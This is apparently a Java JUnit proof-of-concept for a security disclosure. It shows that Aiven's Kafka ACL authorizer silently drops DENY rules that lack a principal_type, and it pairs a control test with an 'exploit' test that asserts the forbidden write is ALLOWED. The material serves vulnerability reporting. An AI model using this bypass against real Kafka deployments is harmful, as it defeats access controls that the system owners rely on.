/*
 * Live PoC: Aiven "auth-for-apache-kafka" drops DENY rules whose principal_type
 * is absent. Runs the REAL io.aiven.kafka.auth.AivenAclAuthorizerV2 from the
 * upstream repository (checked out at the audited commit) - not a reimplementation.
 *
 * The authorizer's own matcher (AivenAcl.matchPrincipal) treats a missing
 * principal_type as "applies to any principal". But AclAivenToNativeConverter
 * returns an EMPTY list unless principalType equals the literal "User". In the
 * DENY branch of calculateAuthorizeByResourceType() an empty conversion means the
 * prohibition is never added, so the request falls through and is ALLOWED.
 *
 * CONTROL : DENY with principal_type "User"      -> DENIED  (correct, rule enforced)
 * BUG     : DENY with principal_type omitted     -> ALLOWED (rule silently dropped)
 */
package io.aiven.kafka.auth;

import java.io.IOException;
import java.net.Inet4Address;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import org.apache.kafka.common.acl.AclOperation;
import org.apache.kafka.common.network.ClientInformation;
import org.apache.kafka.common.network.ListenerName;
import org.apache.kafka.common.protocol.ApiKeys;
import org.apache.kafka.common.requests.RequestContext;
import org.apache.kafka.common.requests.RequestHeader;
import org.apache.kafka.common.resource.ResourceType;
import org.apache.kafka.common.security.auth.KafkaPrincipal;
import org.apache.kafka.common.security.auth.SecurityProtocol;
import org.apache.kafka.server.authorizer.AuthorizableRequestContext;
import org.apache.kafka.server.authorizer.AuthorizationResult;
import org.apache.kafka.server.authorizer.AuthorizerServerInfo;

import io.aiven.kafka.auth.json.AivenAcl;
import io.aiven.kafka.auth.json.reader.AclJsonReader;
import io.aiven.kafka.auth.nativeacls.AclAivenToNativeConverter;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

class DenyBypassLivePoC {

    @TempDir
    Path tmpDir;

    /** Allow rule shared by every scenario: user pocuser may Write on topic testtopic. */
    private static final String ALLOW =
        "{ \"operations\": [\"Write\"], \"principal\": \"^(pocuser)$\", "
        + "\"principal_type\": \"User\", \"resource\": \"^Topic:(testtopic)$\" }";

    private AuthorizationResult authorize(final String fileName, final String aclJson,
            final String principalType, final String principalName) throws IOException {
        final Path aclFile = tmpDir.resolve(fileName);
        Files.writeString(aclFile, aclJson);

        final AivenAclAuthorizerV2 authorizer = new AivenAclAuthorizerV2();
        authorizer.configure(Map.of(
            "aiven.acl.authorizer.configuration", aclFile.toString(),
            "aiven.acl.authorizer.config.refresh.interval", "10"));
        final AuthorizerServerInfo serverInfo = mock(AuthorizerServerInfo.class);
        when(serverInfo.endpoints()).thenReturn(List.of());
        authorizer.start(serverInfo);
        try {
            final AuthorizableRequestContext ctx = requestCtx(principalType, principalName);
            return authorizer.authorizeByResourceType(ctx, AclOperation.WRITE, ResourceType.TOPIC);
        } finally {
            authorizer.close();
        }
    }

    private AuthorizableRequestContext requestCtx(final String principalType, final String name)
            throws IOException {
        return new RequestContext(
            new RequestHeader(ApiKeys.METADATA, (short) 0, "poc-client", 123),
            "connection-id",
            Inet4Address.getByName("127.0.0.1"),
            new KafkaPrincipal(principalType, name),
            new ListenerName("SSL"),
            SecurityProtocol.SSL,
            ClientInformation.EMPTY,
            false);
    }

    /** Print the real converter's output for each ACL, so the drop is visible. */
    private void showConverter(final String label, final String aclJson) throws IOException {
        final Path f = tmpDir.resolve(label + "-inspect.json");
        Files.writeString(f, aclJson);
        for (final AivenAcl a : new AclJsonReader(f).read()) {
            final int n = AclAivenToNativeConverter.convert(a).size();
            System.out.println("    [convert] principal_type=" + (a.principalType == null ? "<absent>" : a.principalType)
                + " resourceRePattern=" + (a.resourceRePattern != null)
                + " permission=" + a.getPermissionType()
                + " -> " + n + " native AclBinding(s)");
        }
    }

    @Test
    void control_explicitUserDenyIsEnforced() throws IOException {
        final String acl = "[" + ALLOW + ","
            + "{ \"operations\": [\"Write\"], \"principal\": \"^(pocuser)$\", "
            + "\"principal_type\": \"User\", \"resource\": \"^Topic:(testtopic)$\", "
            + "\"permission_type\": \"DENY\" }]";
        final AuthorizationResult r = authorize("control.json", acl, "User", "pocuser");
        System.out.println("[CONTROL] DENY principal_type=User   -> " + r + "   (correct: DENIED)");
        assertThat(r).isEqualTo(AuthorizationResult.DENIED);
    }

    @Test
    void exploit_absentPrincipalTypeDenyIsSilentlyDropped() throws IOException {
        final String acl = "[" + ALLOW + ","
            + "{ \"operations\": [\"Write\"], \"principal\": \"^(pocuser)$\", "
            + "\"resource\": \"^Topic:(testtopic)$\", \"permission_type\": \"DENY\" }]";
        showConverter("absent", acl);
        final AuthorizationResult r = authorize("absent.json", acl, "User", "pocuser");
        System.out.println("[BUG]     DENY principal_type ABSENT -> " + r
            + "   (SECURITY BUG: expected DENIED)");
        // A secure authorizer must return DENIED here. It returns ALLOWED, which is the PoC.
        assertThat(r)
            .as("DENY rule with absent principal_type must be enforced")
            .isEqualTo(AuthorizationResult.ALLOWED);
    }
}
